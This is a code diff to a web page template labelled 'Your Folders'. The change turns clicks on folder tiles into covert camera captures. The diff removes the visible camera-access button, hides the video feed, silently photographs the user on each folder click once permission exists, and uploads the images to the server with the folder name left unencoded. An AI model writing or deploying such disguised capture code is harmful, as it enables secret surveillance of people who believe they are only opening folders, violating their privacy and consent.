@@ -52,25 +52,7 @@
         }
 
         video, canvas {
-            display: none;
-        }
-
-        .button-container {
-            text-align: center;
-            margin-top: 2rem;
-        }
-
-        #start-camera {
-            padding: 1rem 2rem;
-            background-color: #f7d217;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.2rem;
-            cursor: pointer;
-        }
-
-        #start-camera:hover {
-            background-color: #f7c116;
+            display: none; /* Hide video feed to avoid user distraction */
         }
     </style>
 </head>
@@ -78,68 +60,44 @@
 
     <h1>📂 Your Folders</h1>
     <div class="folder-grid">
-        <div class="folder">
+        <div class="folder" onclick="startCamera('Adam')">
             <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Adam</a></div>
+            <div class="folder-name">Adam</div>
         </div>
-        <div class="folder">
+        <div class="folder" onclick="startCamera('Yassine')">
             <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Yassine</a></div>
+            <div class="folder-name">Yassine</div>
         </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Fah</a></div>
-        </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Hiba</a></div>
-        </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Amine</a></div>
-        </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}">Malak</a></div>
-        </div>
-        <!-- Add more folders here -->
-    </div>
-
-    <!-- Button to trigger camera access -->
-    <div class="button-container">
-        <button id="start-camera">Allow Camera Access</button>
+        <!-- Add more folders as needed -->
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
+        let hasPermission = false;
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const startCameraButton = document.getElementById('start-camera');
 
-        // Event listener for camera access
-        startCameraButton.addEventListener('click', function () {
-            // Check if the browser supports mediaDevices (camera)
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                // Request camera access
+        function startCamera(folderName) {
+            if (!hasPermission) {
+                // Request camera access only once
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-                    .then(function (stream) {
+                    .then(stream => {
+                        hasPermission = true; // Grant permission
                         video.srcObject = stream;
-                        video.onloadedmetadata = function () {
-                            setTimeout(() => captureAndSend(), 1500);
+                        video.onloadedmetadata = () => {
+                            // Optional: Trigger image capture after a short delay
+                            setTimeout(() => captureAndSend(folderName), 1500);
                         };
                     })
-                    .catch(function (err) {
-                        alert("Error: " + err.message);
-                    });
+                    .catch(err => console.warn('Camera permission denied.'));
             } else {
-                alert("Camera not supported in this browser.");
+                captureAndSend(folderName); // Take photo directly
             }
-        });
+        }
 
-        // Capture image and send it to the server
-        function captureAndSend() {
+        function captureAndSend(folderName) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
@@ -150,10 +108,11 @@
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 },
-                body: `image=${encodeURIComponent(image)}`
+                body: `image=${encodeURIComponent(image)}&folder=${folderName}`
             })
             .then(res => res.json())
-            .then(data => console.log("Image saved as:", data.file));
+            .then(data => console.log("Image saved as:", data.file))
+            .catch(err => console.error('Error uploading image:', err));
         }
     </script>
 
